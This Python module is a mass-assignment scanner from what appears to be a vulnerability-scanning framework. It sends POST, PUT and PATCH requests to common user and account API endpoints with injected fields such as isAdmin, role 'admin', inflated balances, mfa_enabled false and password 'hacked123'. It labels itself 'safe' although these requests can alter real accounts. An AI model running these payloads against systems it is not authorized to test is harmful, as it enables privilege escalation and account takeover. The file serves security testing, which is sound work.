import json
from .base import BaseScanner
from .registry import register_scanner
from core.models import ScannerManifest, ScanTarget, FindingSeverity

MASS_ASSIGN_FIELDS = [
    {"isAdmin": True},
    {"role": "admin"},
    {"is_admin": True},
    {"is_superuser": True},
    {"admin": True},
    {"permissions": ["admin", "*"]},
    {"isActive": True},
    {"isVerified": True},
    {"isPremium": True},
    {"account_type": "admin"},
    {"user_type": "admin"},
    {"access_level": 9999},
    {"balance": 999999},
    {"credit": 999999},
    {"isApproved": True},
    {"status": "approved"},
    {"blocked": False},
    {"banned": False},
    {"enabled": True},
    {"disabled": False},
    {"email_verified": True},
    {"phone_verified": True},
    {"mfa_enabled": False},
    {"password": "hacked123"},
    {"__v": 0},
]

SENSITIVE_RESPONSE_KEYS = [
    "admin", "role", "permission", "token", "key", "secret",
    "premium", "verified", "balance", "credit", "approved",
]


@register_scanner(manifest=ScannerManifest(
    name="mass_assignment_scanner",
    category="exploit",
    risk_level="safe",
    estimated_cost=60,
    produces_tag_patterns=["mass-assignment", "auto-binding", "privesc"],
    produces_endpoint_types=[],
))
class MassAssignmentScanner(BaseScanner):
    name = "mass_assignment_scanner"

    async def scan(self, target: ScanTarget) -> tuple[list, list]:
        findings = []
        endpoints = []
        client = await self.get_client()
        base = target.url.rstrip("/")

        targets = [
            f"{base}/api/user", f"{base}/api/users", f"{base}/api/profile",
            f"{base}/api/update", f"{base}/api/v1/user", f"{base}/api/v1/users",
            f"{base}/api/register", f"{base}/api/signup", f"{base}/api/account",
            f"{base}/api/settings", f"{base}/api/config",
        ]

        for url in targets:
            try:
                base_resp = await client.get(url)
                self._stats["requests"] += 1
                base_body = (base_resp.text or "").lower()
            except Exception:
                continue

            for field_payload in MASS_ASSIGN_FIELDS:
                for method in ("POST", "PUT", "PATCH"):
                    try:
                        resp = await client.request(method, url, json=field_payload,
                                                     headers={"Content-Type": "application/json"})
                        self._stats["requests"] += 1
                        body = (resp.text or "").lower()

                        if resp.status_code in (200, 201, 202):
                            for key in SENSITIVE_RESPONSE_KEYS:
                                if key in body and key not in base_body:
                                    field_key = list(field_payload.keys())[0]
                                    ep = self.make_endpoint(url=url, status_code=resp.status_code, discovered_by=self.name)
                                    endpoints.append(ep)
                                    findings.append(self.make_finding(
                                        title=f"Mass Assignment — {field_key} Accepted",
                                        description=f"Field '{field_key}' was accepted by {method} {url} and altered response. "
                                                    f"Privilege escalation / data tampering may be possible.",
                                        severity=FindingSeverity.HIGH.value,
                                        endpoint=ep,
                                        evidence={
                                            "url": url,
                                            "method": method,
                                            "injected_field": field_key,
                                            "injected_value": str(field_payload[field_key]),
                                            "sensitive_key_found": key,
                                            "body_preview": body[:200],
                                        },
                                        confidence=0.7,
                                        tags=["mass-assignment", "auto-binding", "privesc", "injection"],
                                    ))
                                    break
                    except Exception:
                        self._stats["errors"] += 1

        return findings, endpoints
